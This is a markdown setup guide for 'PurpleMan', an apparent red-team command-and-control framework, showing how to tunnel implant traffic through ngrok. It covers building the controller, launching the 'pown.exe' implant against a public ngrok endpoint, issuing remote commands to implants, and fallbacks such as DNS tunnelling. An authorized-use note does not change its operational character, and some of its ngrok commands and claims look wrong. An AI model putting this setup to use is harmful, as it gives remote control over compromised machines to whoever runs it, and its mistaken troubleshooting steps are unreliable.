# NGROK Tunneling Integration Guide

## Overview
This document explains how to use ngrok for cross-network C2 communication in PurpleMan.

## Prerequisites

### 1. Install ngrok
- Download from https://ngrok.com/download
- Create account at https://ngrok.com
- Get your auth token from dashboard

### 2. Install Dependencies
```bash
# Linux
sudo apt-get install libcurl4-openssl-dev nlohmann-json3-dev

# macOS
brew install curl nlohmann-json

# Windows (vcpkg)
vcpkg install curl:x64-windows nlohmann-json:x64-windows
```

## Setup Instructions

### Step 1: Start ngrok
```bash
# Authenticate with your token (first time only)
ngrok config add-authtoken YOUR_AUTH_TOKEN_HERE

# Start TCP tunnel on port 8443
ngrok tcp 8443
```

### Step 2: Build PurpleMan with ngrok support
```bash
cmake -S . -B build -DCMAKE_BUILD_TYPE=Release -DENABLE_NGROK=ON
cmake --build build --config Release
```

### Step 3: Run Controller with Ngrok
```bash
# Start controller with ngrok enabled
.\build\Release\c2_controller.exe

# At the C2> prompt, type:
ngrok_init
ngrok_status
```

### Step 4: Configure Implant
```powershell
# Get the ngrok public URL from controller output
# Example: tcp://0.tcp.ngrok.io:12345

# Run implant with ngrok endpoint
.\build\Release\pown.exe --server 0.tcp.ngrok.io --port 12345
```

## Usage

### Controller Commands

```
# Initialize ngrok tunnel
ngrok_init

# Display ngrok tunnel status and public URL
ngrok_status

# Send command to all implants via ngrok
exec all whoami

# Send command to specific implant
exec IMPLANT_ID sysinfo

# Stop ngrok tunnels
ngrok_stop
```

### Implant Environment Variables

```powershell
# Set ngrok endpoint before running implant
$env:PWN_C2_SERVER = "0.tcp.ngrok.io"
$env:PWN_C2_PORT = "12345"
.\build\Release\pown.exe
```

## Architecture

### Data Flow

```
Implant (behind NAT)
    ↓
Ngrok Client (local 8443)
    ↓
Ngrok Cloud (TCP Tunnel)
    ↓
Ngrok Public Endpoint (0.tcp.ngrok.io:12345)
    ↓
C2 Controller (public access)
```

### Network Channels Supported

1. **TCP Tunnel** - Direct TCP communication through ngrok
2. **HTTPS Tunnel** - TLS-encrypted communication
3. **USB Dead-drop** - Falls back to offline if ngrok unavailable
4. **DNS Tunneling** - Alternative if TCP blocked

## Security Considerations

⚠️ **IMPORTANT SECURITY NOTES**

1. **Authentication**
   - Always use a strong ngrok auth token
   - Store tokens securely (never commit to git)
   - Rotate tokens regularly

2. **Encryption**
   - ngrok tunnels are encrypted in transit
   - Enable TLS/HTTPS tunnel mode for additional security
   - Implant still uses optional encryption (config.useEncryption)

3. **Access Control**
   - ngrok provides unique public URLs that are hard to guess
   - Only share URLs with authorized systems
   - Consider firewall rules to restrict access

4. **Logging**
   - ngrok logs all connection attempts
   - Review logs regularly for suspicious activity
   - Configure ngrok request logging

## Troubleshooting

### ngrok Connection Refused
```
[!] Failed to connect to ngrok API

Solution:
1. Verify ngrok is running: ngrok http 4040
2. Check ngrok is on 127.0.0.1:4040
3. Ensure port 8443 is available locally
```

### Public URL Not Found
```
[!] Failed to get ngrok public URL

Solution:
1. Check ngrok tunnel is active
2. Wait a few seconds for tunnel to establish
3. Run: ngrok list-tunnels
4. Verify tunnel name matches "purpleman-c2"
```

### Implant Cannot Connect
```
[!] Connection failed

Solution:
1. Get correct public URL from ngrok: ngrok http 4040
2. Verify implant is using correct host:port
3. Check firewall allows outbound TCP
4. Test manually: telnet 0.tcp.ngrok.io 12345
```

### Certificate Errors
```
[!] TLS handshake failed

Solution:
1. For HTTPS tunnel, use proper certificates
2. Disable certificate validation in testing
3. Use TCP tunnel instead of HTTPS for testing
```

## Advanced Configuration

### Custom Tunnel Names
```cpp
ngrokClient->CreateTCPTunnel("my-custom-tunnel");
```

### Multiple Tunnels
```cpp
ngrokClient->CreateTCPTunnel("purpleman-c2");
ngrokClient->CreateHTTPSTunnel("purpleman-https");
```

### Tunnel Info
```cpp
auto info = ngrokClient->GetTunnelInfo("purpleman-c2");
auto publicURL = ngrokClient->GetPublicURL("purpleman-c2");
auto isConnected = ngrokClient->IsConnected("purpleman-c2");
```

## Performance Considerations

- **Latency**: ngrok adds minimal latency (~100-200ms)
- **Bandwidth**: No bandwidth limits on ngrok free tier
- **Connections**: Supports multiple concurrent connections
- **Throughput**: Suitable for command execution (not for bulk file transfers)

## Legal and Ethical Notes

⚠️ **Authorized Use Only**

ngrok tunneling must only be used for:
- Authorized penetration testing
- Your own systems
- Systems with explicit written permission

Any unauthorized access is illegal.

## References

- [ngrok Documentation](https://ngrok.com/docs)
- [ngrok API](https://ngrok.com/docs/api/tunnels)
- [ngrok Pricing](https://ngrok.com/pricing)

